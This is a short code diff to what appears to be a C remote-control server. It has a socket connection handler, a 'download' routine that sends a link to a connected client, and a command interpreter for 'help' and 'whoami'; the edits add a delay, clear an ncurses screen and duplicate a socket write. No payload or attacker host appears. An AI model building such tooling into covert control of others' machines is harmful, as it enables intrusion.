@@ -103,6 +103,7 @@ int connection_handler(int t, struct server_info * inf)
 
 void randptoScreen(int t)
 {
+	sleep(1);
 	char readingBuf[BUFSIZE];
 	for(int i = 0; i < BUFSIZE; i++){ readingBuf[i] = '\0'; }
 
@@ -251,7 +252,8 @@ void download(int sock)
 		getstr(link);
 	}
 	write(sock, link, strlen(link));
-	read(sock, readPrompt, sizeof(readPrompt));
+	write(sock, link, strlen(link));
+
 	if(serverThread.cmd){
 		printf("[*] File downloaded\n");
 	} else if(serverThread.ncurses){
@@ -309,7 +311,7 @@ int commandInterpreter(struct server_info * inf, int * t)
 {
 
 	int inc = *t;
-
+	if (serverThread.ncurses){ clearmain(); }
 	if(!strcmp(serverThread.buf, "help\n") || !strcmp(serverThread.buf, "help")){
 		help();
 	} else if(!strcmp(serverThread.buf, "whoami\n") || !strcmp(serverThread.buf, "whoami")){
